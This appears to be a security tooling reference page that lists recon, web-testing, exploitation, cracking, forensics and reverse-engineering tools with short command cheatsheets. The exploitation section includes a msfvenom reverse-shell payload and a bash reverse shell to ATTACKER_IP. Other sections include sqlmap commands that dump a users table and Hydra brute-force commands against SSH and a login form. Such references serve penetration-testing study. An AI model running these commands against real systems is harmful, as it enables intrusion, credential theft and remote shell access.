# Tooling Reference

> Tools are multipliers. A tool without understanding multiplies incompetence. A tool with understanding multiplies capability.

All tools listed here are **free** unless marked `[Paid]` or `[Freemium]`.

---

## Reconnaissance

| Tool | Purpose | Install |
| :--- | :--- | :--- |
| [nmap](https://nmap.org) | Port scanning, service detection, NSE scripting | `apt install nmap` |
| [Masscan](https://github.com/robertdavidgraham/masscan) | Ultra-fast port scanner (internet-scale) | `apt install masscan` |
| [Shodan](https://shodan.io) `[Freemium]` | Internet-wide device search engine | Web + CLI: `pip install shodan` |
| [subfinder](https://github.com/projectdiscovery/subfinder) | Passive subdomain enumeration | `go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest` |
| [amass](https://github.com/owasp-amass/amass) | Deep subdomain enumeration + mapping | `apt install amass` |
| [theHarvester](https://github.com/laramies/theHarvester) | OSINT: emails, subdomains, IPs | Built into Kali |
| [Maltego](https://maltego.com) `[Freemium]` | Link analysis and OSINT visualization | maltego.com |
| [recon-ng](https://github.com/lanmaster53/recon-ng) | Web reconnaisance framework | Built into Kali |
| [SpiderFoot](https://github.com/smicallef/spiderfoot) | Automated OSINT collection | `pip install spiderfoot` |

```bash
# nmap cheatsheet
nmap -sn 192.168.1.0/24          # Host discovery (no port scan)
nmap -sV -sC -O target           # Version, scripts, OS
nmap -p- --min-rate 5000 target  # All ports, faster
nmap -A target                   # Aggressive (sV + sC + O + traceroute)
nmap --script vuln target        # Run all vuln detection scripts
```

---

## Web Application Testing

| Tool | Purpose | Install |
| :--- | :--- | :--- |
| [Burp Suite Community](https://portswigger.net/burp/communitydownload) | HTTP proxy, scanner, intruder, repeater | portswigger.net |
| [OWASP ZAP](https://zaproxy.org) | Open source web scanner | `apt install zaproxy` |
| [ffuf](https://github.com/ffuf/ffuf) | Fast fuzzer — directories, subdomains, parameters | `apt install ffuf` |
| [gobuster](https://github.com/OJ/gobuster) | Directory/DNS/vhost bruteforce | `apt install gobuster` |
| [Nikto](https://cirt.net/Nikto2) | Web server vulnerability scanner | `apt install nikto` |
| [SQLmap](https://sqlmap.org) | Automated SQL injection | `apt install sqlmap` |
| [nuclei](https://github.com/projectdiscovery/nuclei) | Template-based vulnerability scanner | `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest` |
| [WhatWeb](https://github.com/urbanadventurer/WhatWeb) | Web technology fingerprinting | `apt install whatweb` |
| [Wappalyzer](https://wappalyzer.com) | Browser ext: tech fingerprinting | Browser extension |

```bash
# Directory bruteforce with ffuf
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403

# Subdomain enumeration with ffuf
ffuf -u https://FUZZ.target.com -w subdomains.txt -H "Host: FUZZ.target.com" -mc 200

# SQLmap — automated injection
sqlmap -u "https://target.com/page?id=1" --dbs
sqlmap -u "https://target.com/page?id=1" -D dbname --tables
sqlmap -u "https://target.com/page?id=1" -D dbname -T users --dump
```

**Wordlists:** [SecLists](https://github.com/danielmiessler/SecLists) — install: `apt install seclists` or clone to `/usr/share/seclists/`

---

## Exploitation & Post-Exploitation

| Tool | Purpose | Install |
| :--- | :--- | :--- |
| [Metasploit](https://metasploit.com) | Exploitation framework | `apt install metasploit-framework` |
| [msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html) | Payload generation (part of Metasploit) | Included |
| [Netcat (nc)](https://nmap.org/ncat/) | Swiss army knife — shells, port relay | `apt install netcat-openbsd` |
| [pwncat](https://github.com/calebstewart/pwncat) | Advanced reverse shell handler | `pip install pwncat-cs` |
| [Impacket](https://github.com/fortra/impacket) | Windows/AD protocols — PTH, SMB, Kerberos | `pip install impacket` |
| [CrackMapExec / NetExec](https://github.com/Pennyw0rth/NetExec) | Windows network pentesting | `pip install netexec` |
| [BloodHound](https://github.com/SpecterOps/BloodHound) | Active Directory attack path mapping | GitHub releases |
| [Mimikatz](https://github.com/gentilkiwi/mimikatz) | Windows credential extraction | GitHub (run on target) |
| [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) | Windows Remote Management shell | `gem install evil-winrm` |

```bash
# Metasploit workflow
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 4444
run

# Generate payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o payload.exe

# Netcat reverse shell
# Attacker (listener):
nc -lvnp 4444
# Victim (Linux):
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

---

## Password & Credential Attacks

| Tool | Purpose | Install |
| :--- | :--- | :--- |
| [Hashcat](https://hashcat.net) | GPU-accelerated password cracking | `apt install hashcat` |
| [John the Ripper](https://www.openwall.com/john/) | Password cracking (CPU-based) | `apt install john` |
| [Hydra](https://github.com/vanhauser-thc/thc-hydra) | Online brute-force (SSH, FTP, HTTP) | `apt install hydra` |
| [CeWL](https://github.com/digininja/CeWL) | Custom wordlist generator from website | `apt install cewl` |
| [crunch](https://github.com/jim3ma/crunch) | Generate wordlists by pattern | `apt install crunch` |

```bash
# Hashcat - identify hash type first: https://hashes.com/en/tools/hash_identifier
# MD5
hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt
# NTLM
hashcat -a 0 -m 1000 ntlm.txt rockyou.txt
# bcrypt
hashcat -a 0 -m 3200 bcrypt.txt rockyou.txt

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --format=NT hash.txt  # Specify format

# Hydra - SSH bruteforce
hydra -l admin -P rockyou.txt ssh://target.com
hydra -l admin -P rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
```

**Wordlists:**
- `rockyou.txt` — `gunzip /usr/share/wordlists/rockyou.txt.gz`
- [SecLists](https://github.com/danielmiessler/SecLists) — comprehensive collections

---

## Forensics

| Tool | Purpose | Install |
| :--- | :--- | :--- |
| [Volatility 3](https://github.com/volatilityfoundation/volatility3) | Memory forensics | `pip install volatility3` |
| [Autopsy](https://www.autopsy.com/) | Disk forensics GUI | autopsy.com |
| [Sleuth Kit](https://www.sleuthkit.org/) | CLI disk analysis | `apt install sleuthkit` |
| [FTK Imager](https://www.exterro.com/digital-forensics-software/ftk-imager) | Forensic imaging (Windows) | exterro.com |
| [Wireshark](https://wireshark.org) | Network packet analysis | `apt install wireshark` |
| [Zeek](https://zeek.org) | Network traffic analysis framework | zeek.org |
| [Eric Z. Tools](https://ericzimmerman.github.io/) | Windows artifact parsers (Registry, evtx, prefetch) | GitHub |
| [Chainsaw](https://github.com/WithSecureLabs/chainsaw) | Fast Windows event log hunting | GitHub releases |
| [KAPE](https://www.kroll.com/kape) | Windows artifact collection | kroll.com (free) |
| [binwalk](https://github.com/ReFirmLabs/binwalk) | Firmware/file extraction | `apt install binwalk` |

---

## Reverse Engineering

| Tool | Purpose | Cost |
| :--- | :--- | :--- |
| [Ghidra](https://ghidra-sre.org/) | Disassembler + decompiler (NSA) | Free |
| [IDA Free](https://hex-rays.com/ida-free/) | Industry-standard disassembler (limited free ver) | Free |
| [x64dbg](https://x64dbg.com/) | Windows userland debugger | Free |
| [GDB + pwndbg](https://github.com/pwndbg/pwndbg) | Linux debugger with exploit dev extensions | Free |
| [Binary Ninja](https://binary.ninja/) | Modern disassembler + decompiler | Paid (student discount) |
| [pwntools](https://docs.pwntools.com/) | Python CTF/exploit dev library | `pip install pwntools` |
| [radare2](https://rada.re/n/) | CLI reverse engineering framework | `apt install radare2` |

---

## Network Analysis

| Tool | Purpose | Install |
| :--- | :--- | :--- |
| [Wireshark](https://wireshark.org) | Packet capture + GUI analysis | `apt install wireshark` |
| [tcpdump](https://www.tcpdump.org/) | CLI packet capture | `apt install tcpdump` |
| [tshark](https://tshark.dev/) | CLI Wireshark | Included with Wireshark |
| [Scapy](https://scapy.net/) | Python packet manipulation library | `pip install scapy` |
| [ngrep](https://github.com/jpr5/ngrep) | Grep for network traffic | `apt install ngrep` |

---

## Mobile Security

| Tool | Purpose | Install |
| :--- | :--- | :--- |
| [Frida](https://frida.re) | Dynamic instrumentation | `pip install frida-tools` |
| [objection](https://github.com/sensepost/objection) | Runtime mobile exploration | `pip install objection` |
| [MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF) | Automated mobile analysis | Docker: `docker pull opensecurity/mobile-security-framework-mobsf` |
| [APKTool](https://apktool.org/) | APK decoding | `apt install apktool` |
| [JADX](https://github.com/skylot/jadx) | APK decompilation | GitHub releases |
| [ADB](https://developer.android.com/tools/adb) | Android Debug Bridge | Included in Android Studio |

---

## Cryptography Tools

| Tool | Purpose | Install |
| :--- | :--- | :--- |
| [CyberChef](https://gchq.github.io/CyberChef/) | Browser-based encoding/decoding/crypto | Web app |
| [openssl](https://openssl.org) | TLS, cert analysis, crypto operations | `apt install openssl` |
| [RsaCTFTool](https://github.com/RsaCtfTool/RsaCtfTool) | Automated RSA attack tool | `pip install rsactftool` |
| [pycryptodome](https://pycryptodome.readthedocs.io/) | Python cryptography library | `pip install pycryptodome` |
| [hashid](https://github.com/psypanda/hashID) | Hash type identification | `pip install hashid` |
| [testssl.sh](https://testssl.sh/) | TLS configuration checker | `git clone https://github.com/testssl/testssl.sh` |

---

## Distributions (Full Environments)

| OS | Purpose | Download |
| :--- | :--- | :--- |
| [Kali Linux](https://www.kali.org/) | Offensive security — the standard | kali.org |
| [Parrot OS](https://parrotsec.org/) | Pentesting + forensics + privacy | parrotsec.org |
| [FLARE VM](https://github.com/mandiant/flare-vm) | Windows malware analysis environment | GitHub |
| [REMnux](https://remnux.org/) | Linux malware analysis distribution | remnux.org |
| [SIFT Workstation](https://www.sans.org/tools/sift-workstation/) | DFIR-focused Ubuntu distribution | SANS |
